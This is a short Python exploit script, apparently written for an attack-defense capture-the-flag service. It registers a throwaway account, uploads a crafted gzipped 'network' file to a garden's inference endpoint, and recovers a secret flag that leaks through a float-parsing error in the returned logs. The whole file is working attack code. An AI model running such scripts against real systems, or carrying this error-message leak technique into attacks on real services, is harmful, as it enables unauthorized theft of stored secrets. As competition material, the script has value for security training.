#!/usr/bin/python3
import base64
import gzip
import random
import re
import string
import sys

import requests


# Parse float leaking flag in logs

def exploit(ip, flag_id):
    s = requests.Session()

    username = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
    password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
    s.post(f'http://{ip}:10041/registration', params={'username': username, 'password': password})

    with open('exploit2_3_network.txt', 'rb') as f:
        network = f.read()

    network_gzip = gzip.compress(network)
    r = s.post(
        f'http://{ip}:10041/gardens/{flag_id}/infer',
        files={'network': network_gzip},
    )
    j = r.json()

    s = j['stdout']
    log = gzip.decompress(
        base64.b64decode(s.replace('_', '/').replace('-', '+').encode() + b'=' * (-len(s) % 4))).decode()

    h = re.findall("[a-z0-9]+ is not a float", log)[0].split(' ')[0]
    print(bytes.fromhex(h).decode('utf-8'))


if __name__ == '__main__':
    if len(sys.argv) != 3:
        sys.stderr.write('Usage: ./exploit2_3.py IP FLAG_ID\n')
        sys.exit(1)
    exploit(sys.argv[1], sys.argv[2])
